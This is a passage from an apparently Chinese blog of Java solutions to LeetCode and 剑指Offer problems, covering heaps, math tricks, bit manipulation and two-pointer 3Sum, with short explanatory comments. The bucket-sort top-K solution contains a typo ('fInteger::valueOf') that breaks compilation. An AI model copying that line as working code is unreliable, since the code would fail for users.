(!pq.isEmpty()) &#123;</span><br><span class="line">            res[i--] = pq.remove();</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 桶排序</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] topKFrequent(<span class="type">int</span>[] nums, <span class="type">int</span> k) &#123;</span><br><span class="line">        HashMap&lt;Integer, Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> num :</span><br><span class="line">                nums) &#123;</span><br><span class="line">            map.put(num, map.getOrDefault(num, <span class="number">0</span>) + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        List&lt;Integer&gt;[] lists = <span class="keyword">new</span> <span class="title class_">List</span>[nums.length + <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span> (Integer key :</span><br><span class="line">                map.keySet()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (lists[map.get(key)] == <span class="literal">null</span>) &#123;</span><br><span class="line">                lists[map.get(key)] = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">            &#125;</span><br><span class="line">            lists[map.get(key)].add(key);</span><br><span class="line">        &#125;</span><br><span class="line">        ArrayList&lt;Integer&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> nums.length; i &gt; <span class="number">0</span> &amp;&amp; list.size() &lt; k; i--) &#123;</span><br><span class="line">            <span class="keyword">if</span> (lists[i] == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            list.addAll(lists[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> list.stream().mapToInt(fInteger::valueOf).toArray();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="剑指-Offer-41-数据流中的中位数"><a href="#剑指-Offer-41-数据流中的中位数" class="headerlink" title="剑指 Offer 41. 数据流中的中位数"></a><a href="https://leetcode-cn.com/problems/shu-ju-liu-zhong-de-zhong-wei-shu-lcof/">剑指 Offer 41. 数据流中的中位数</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">用大顶堆+小顶堆方法，可以看作大顶堆是普通班，小顶堆是实验班。数量上时刻保持 小顶-大顶&lt;=1（两堆相等或者小顶比大顶多一个）。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">新学生先入普通班（大顶堆），此时可能会失去平衡了，于是取大顶堆的第一个（班里最好的学生）加入实验班（小顶堆），判断若数量过多（不是等于或多一个），取第一个（实验班里最差的学生）到普通班（大顶堆）里。 取中位数的时候，若两堆数量相等，则各取堆顶取平均，若小顶比大顶多一，则多的那一个就是中位数。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MedianFinder</span> &#123;</span><br><span class="line">    PriorityQueue&lt;Integer&gt; left;</span><br><span class="line">    PriorityQueue&lt;Integer&gt; right;</span><br><span class="line">    <span class="comment">/** initialize your data structure here. */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MedianFinder</span><span class="params">()</span> &#123;</span><br><span class="line">        left = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;((x, y)-&gt; y - x);</span><br><span class="line">        right = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addNum</span><span class="params">(<span class="type">int</span> num)</span> &#123;</span><br><span class="line">        <span class="comment">// 从左边加,然后再加到右边</span></span><br><span class="line">        left.add(num);</span><br><span class="line">        right.add(left.poll());</span><br><span class="line">        <span class="keyword">if</span> (left.size() + <span class="number">1</span> &lt; right.size()) &#123;</span><br><span class="line">            left.add(right.poll());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span> <span class="title function_">findMedian</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (right.size() &gt; left.size()) &#123;</span><br><span class="line">            <span class="keyword">return</span> right.peek();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (<span class="type">double</span>) (left.peek() + right.peek()) / <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="数学"><a href="#数学" class="headerlink" title="数学"></a>数学</h2><h3 id="7-整数反转"><a href="#7-整数反转" class="headerlink" title="7. 整数反转"></a><a href="https://leetcode-cn.com/problems/reverse-integer/">7. 整数反转</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">reverse</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">ans</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (x != <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="type">int</span> <span class="variable">pop</span> <span class="operator">=</span> x % <span class="number">10</span>;</span><br><span class="line">      <span class="keyword">if</span> (ans &gt; Integer.MAX_VALUE / <span class="number">10</span> || ans &lt; Integer.MIN_VALUE / <span class="number">10</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      ans = ans * <span class="number">10</span> + pop;</span><br><span class="line">      x = x / <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="9-回文数-x2F"><a href="#9-回文数-x2F" class="headerlink" title="9. 回文数&#x2F;"></a><a href="https://leetcode-cn.com/problems/palindrome-number/">9. 回文数</a>&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isPalindrome</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (x &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> <span class="variable">tmp</span> <span class="operator">=</span> x;</span><br><span class="line">    <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (x != <span class="number">0</span>) &#123;</span><br><span class="line">      i = i * <span class="number">10</span> + x % <span class="number">10</span>;</span><br><span class="line">      x = x / <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="type">return</span> <span class="variable">tmp</span> <span class="operator">=</span>= i;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="292-Nim-游戏-x2F"><a href="#292-Nim-游戏-x2F" class="headerlink" title="292. Nim 游戏&#x2F;"></a><a href="https://leetcode-cn.com/problems/nim-game/">292. Nim 游戏</a>&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">canWinNim</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> (n % <span class="number">4</span>) != <span class="number">0</span>;	</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="剑指-Offer-62-圆圈中最后剩下的数字"><a href="#剑指-Offer-62-圆圈中最后剩下的数字" class="headerlink" title="剑指 Offer 62. 圆圈中最后剩下的数字"></a><a href="https://leetcode-cn.com/problems/yuan-quan-zhong-zui-hou-sheng-xia-de-shu-zi-lcof/">剑指 Offer 62. 圆圈中最后剩下的数字</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">lastRemaining</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span> m)</span> &#123;</span><br><span class="line">        ArrayList&lt;Integer&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(n);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            list.add(i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (n &gt; <span class="number">1</span>) &#123;</span><br><span class="line">            index = (index + m - <span class="number">1</span>) % n;</span><br><span class="line">            list.remove(index);</span><br><span class="line">            n--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> list.get(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;	</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">只关心最终活着那个人的序号变化</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">实际只用关心G的移动，不用在意哪步谁会被杀。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">lastRemaining</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span> m)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">ans</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// 最后一轮剩下2个人，所以从2开始反推</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">2</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            ans = (ans + m) % i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h3 id="371-两整数之和"><a href="#371-两整数之和" class="headerlink" title="371. 两整数之和"></a><a href="https://leetcode-cn.com/problems/sum-of-two-integers/">371. 两整数之和</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 两个整数a, b; a ^ b是无进位的相加； a&amp;b得到每一位的进位；让无进位相加的结果与进位不断的异或， 直到进位为0；</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getSum</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">        <span class="type">int</span> sum, carry;</span><br><span class="line">        sum = a ^ b;</span><br><span class="line">        carry = (a &amp; b) &lt;&lt; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (carry != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> getSum(sum, carry);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="剑指-Offer-20-表示数值的字符串"><a href="#剑指-Offer-20-表示数值的字符串" class="headerlink" title="剑指 Offer 20. 表示数值的字符串"></a><a href="https://leetcode-cn.com/problems/biao-shi-shu-zhi-de-zi-fu-chuan-lcof/">剑指 Offer 20. 表示数值的字符串</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">‘.’出现正确情况：只出现一次，且在e的前面</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">‘e’出现正确情况：只出现一次，且出现前有数字</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">‘+’‘-’出现正确情况：只能在开头和e后一位</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isNumber</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (s == <span class="literal">null</span> || s.length() == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        s = s.trim();</span><br><span class="line">        <span class="type">char</span>[] sc = s.toCharArray();</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">numFlag</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">eFlag</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">dotFlag</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; sc.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (sc[i] &gt;= <span class="string">&#x27;0&#x27;</span> &amp;&amp; sc[i] &lt;= <span class="string">&#x27;9&#x27;</span>) &#123;</span><br><span class="line">                numFlag = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (sc[i] == <span class="string">&#x27;.&#x27;</span> &amp;&amp; !dotFlag &amp;&amp; !eFlag) &#123;</span><br><span class="line">                dotFlag = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((sc[i] == <span class="string">&#x27;e&#x27;</span> || sc[i] == <span class="string">&#x27;E&#x27;</span>) &amp;&amp; !eFlag &amp;&amp; numFlag) &#123;</span><br><span class="line">                eFlag = <span class="literal">true</span>;</span><br><span class="line">                numFlag = <span class="literal">false</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((sc[i] == <span class="string">&#x27;+&#x27;</span> || sc[i] == <span class="string">&#x27;-&#x27;</span>) &amp;&amp; (i == <span class="number">0</span> || sc[i - <span class="number">1</span>] == <span class="string">&#x27;e&#x27;</span> || sc[i - <span class="number">1</span>] == <span class="string">&#x27;E&#x27;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> numFlag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="剑指-Offer-64-求1-2-…-n"><a href="#剑指-Offer-64-求1-2-…-n" class="headerlink" title="剑指 Offer 64. 求1+2+…+n"></a><a href="https://leetcode-cn.com/problems/qiu-12n-lcof/">剑指 Offer 64. 求1+2+…+n</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">sumNums</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">x</span> <span class="operator">=</span> n &gt; <span class="number">1</span> &amp;&amp; (n += sumNums(n - <span class="number">1</span>)) &gt; <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> n;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="剑指-Offer-56-I-数组中数字出现的次数"><a href="#剑指-Offer-56-I-数组中数字出现的次数" class="headerlink" title="剑指 Offer 56 - I. 数组中数字出现的次数"></a><a href="https://leetcode-cn.com/problems/shu-zu-zhong-shu-zi-chu-xian-de-ci-shu-lcof/">剑指 Offer 56 - I. 数组中数字出现的次数</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 通过mask分为2组</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] singleNumbers(<span class="type">int</span>[] nums) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">            k = k ^ nums[i];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">mask</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> ((mask &amp; k) == <span class="number">0</span>) &#123;</span><br><span class="line">            mask &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> num :</span><br><span class="line">                nums) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((num &amp; mask) == <span class="number">0</span>) &#123;</span><br><span class="line">                a ^= num;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                b ^= num;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;a, b&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="剑指-Offer-56-II-数组中数字出现的次数-II"><a href="#剑指-Offer-56-II-数组中数字出现的次数-II" class="headerlink" title="剑指 Offer 56 - II. 数组中数字出现的次数 II"></a><a href="https://leetcode-cn.com/problems/shu-zu-zhong-shu-zi-chu-xian-de-ci-shu-ii-lcof/">剑指 Offer 56 - II. 数组中数字出现的次数 II</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 计算每个位1出现的次数， 然后对3取余;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">singleNumber</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] temp = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">32</span>];</span><br><span class="line">        <span class="type">int</span> mask;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> num :</span><br><span class="line">                nums) &#123;</span><br><span class="line">            mask = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">                <span class="keyword">if</span> ((num &amp; mask) != <span class="number">0</span>) &#123;</span><br><span class="line">                    temp[i] ++;</span><br><span class="line">                &#125;</span><br><span class="line">                mask = mask &lt;&lt; <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        mask = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (temp[i] % <span class="number">3</span> == <span class="number">1</span>) &#123;</span><br><span class="line">                res = res ^ mask;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            mask &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">singleNumber</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        Map&lt;Integer, Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> num :</span><br><span class="line">                nums) &#123;</span><br><span class="line">            map.put(num, map.getOrDefault(num, <span class="number">0</span>) + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> num :</span><br><span class="line">                nums) &#123;</span><br><span class="line">            <span class="keyword">if</span> (map.get(num) == <span class="number">1</span>) &#123;</span><br><span class="line">                res = num;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="剑指-Offer-39-数组中出现次数超过一半的数字"><a href="#剑指-Offer-39-数组中出现次数超过一半的数字" class="headerlink" title="剑指 Offer 39. 数组中出现次数超过一半的数字"></a><a href="https://leetcode-cn.com/problems/shu-zu-zhong-chu-xian-ci-shu-chao-guo-yi-ban-de-shu-zi-lcof/">剑指 Offer 39. 数组中出现次数超过一半的数字</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">摩尔投票法</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">给定的数组总是存在多数元素 ，因此本题不用考虑数组不存在众数 的情况。若考虑，需要加入一个 “验证环节” ，遍历数组 nums 统计 x 的数量。</span></span><br><span class="line"><span class="comment">若 x 的数量超过数组长度一半，则返回 x ；</span></span><br><span class="line"><span class="comment">否则，返回未找到众数；</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">majorityElement</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">0</span>, votes = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> num :</span><br><span class="line">                nums) &#123;</span><br><span class="line">            <span class="keyword">if</span> (votes == <span class="number">0</span>) &#123;</span><br><span class="line">                x = num;</span><br><span class="line">            &#125;</span><br><span class="line">            votes += x == num ? <span class="number">1</span> : -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> x;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="470-用-Rand7-实现-Rand10"><a href="#470-用-Rand7-实现-Rand10" class="headerlink" title="470. 用 Rand7() 实现 Rand10()"></a><a href="https://leetcode-cn.com/problems/implement-rand10-using-rand7/">470. 用 Rand7() 实现 Rand10()</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> <span class="keyword">extends</span> <span class="title class_">SolBase</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">rand10</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> rand7();</span><br><span class="line">            <span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span> rand7();</span><br><span class="line">            <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> (a-<span class="number">1</span>)*<span class="number">7</span> + b; <span class="comment">// rand 49</span></span><br><span class="line">            <span class="keyword">if</span>(num &lt;= <span class="number">40</span>) <span class="keyword">return</span> num % <span class="number">10</span> + <span class="number">1</span>; <span class="comment">// 拒绝采样</span></span><br><span class="line">            </span><br><span class="line">            a = num - <span class="number">40</span>; <span class="comment">// rand 9</span></span><br><span class="line">            b = rand7();</span><br><span class="line">            num = (a-<span class="number">1</span>)*<span class="number">7</span> + b; <span class="comment">// rand 63</span></span><br><span class="line">            <span class="keyword">if</span>(num &lt;= <span class="number">60</span>) <span class="keyword">return</span> num % <span class="number">10</span> + <span class="number">1</span>;</span><br><span class="line">            </span><br><span class="line">            a = num - <span class="number">60</span>; <span class="comment">// rand 3</span></span><br><span class="line">            b = rand7();</span><br><span class="line">            num = (a-<span class="number">1</span>)*<span class="number">7</span> + b; <span class="comment">// rand 21</span></span><br><span class="line">            <span class="keyword">if</span>(num &lt;= <span class="number">20</span>) <span class="keyword">return</span> num % <span class="number">10</span> + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="数组和字符串"><a href="#数组和字符串" class="headerlink" title="数组和字符串"></a>数组和字符串</h2><h3 id="15-三数之和-x2F-x2F"><a href="#15-三数之和-x2F-x2F" class="headerlink" title="15. 三数之和&#x2F;&#x2F;"></a><a href="https://leetcode-cn.com/problems/3sum/">15. 三数之和</a>&#x2F;&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 排序+双指针</span></span><br><span class="line"><span class="comment">// 注意相同元素的处理,先元素直接跳过就不会有重复,不需要通过res.contains(tmp)来判断(会超时).</span></span><br><span class="line"><span class="comment">// -4 -1 -1 0 1 2</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">threeSum</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        List&lt;List&lt;Integer&gt;&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">if</span> (nums == <span class="literal">null</span> || nums.length &lt; <span class="number">3</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        &#125;</span><br><span class="line">        Arrays.sort(nums);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length - <span class="number">2</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[i] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (i &gt; <span class="number">0</span> &amp;&amp; nums[i] == nums[i - <span class="number">1</span>]) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">int</span> <span class="variable">l</span> <span class="operator">=</span> i + <span class="number">1</span>;</span><br><span class="line">            <span class="type">int</span> <span class="variable">r</span> <span class="operator">=</span> nums.length - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">while</span> (l &lt; r) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> nums[i] + nums[l] + nums[r];</span><br><span class="line">                <span class="keyword">if</span> (sum == <span class="number">0</span>) &#123;</span><br><span class="line">                    ArrayList&lt;Integer&gt; tmp = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">                    tmp.add(nums[i]);</span><br><span class="line">                    tmp.add(nums[l]);</span><br><span class="line">                    tmp.add(nums[r]);</span><br><span class="line">                    res.add(tmp);</span><br><span class="line">                    <span class="keyword">while</span> (l &lt; r &amp;&amp; nums[l] == nums[l + <span class="number">1</span>]) &#123;</span><br><span class="line">                        ++l;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">while</span> (l &lt; r &amp;&amp; nums[r] == nums[r - <span class="number">1</span>]) &#123;</span><br><span class="line">                        --r;</span><br><span class="line">                    &#125;</span><br><span class="line">                    ++l;</span><br><span class="line">                    --r;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (sum &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                    ++l;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    --r;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span 